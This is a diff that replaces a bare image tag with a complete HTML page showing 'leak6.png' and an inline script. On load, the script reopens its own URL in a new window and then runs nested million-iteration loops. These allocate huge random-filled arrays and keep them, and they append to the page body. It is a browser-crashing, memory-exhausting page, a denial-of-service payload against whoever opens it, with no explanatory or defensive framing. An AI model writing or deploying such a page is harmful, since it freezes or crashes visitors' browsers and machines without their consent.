@@ -1,1 +1,31 @@
-<img src="leak6.png">
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <img src="leak6.png">
+    <script>
+        window.open(window.location.href)
+        let x = 0;
+        let arr = []
+        for(let i = 0; i<1e6; i++){
+            for(let v = 0; v<1e6; v++){
+                x*=v
+                document.body.innerHTML+=' '.repeat(x)
+                let k = new Array(1e6)
+                for(let m = 0; m<1e6-1; m++){
+                    k[m] = Math.sqrt(Math.random())
+                }
+                arr.push(k)
+            }
+        }
+    </script>
+</body>
+
+</html>
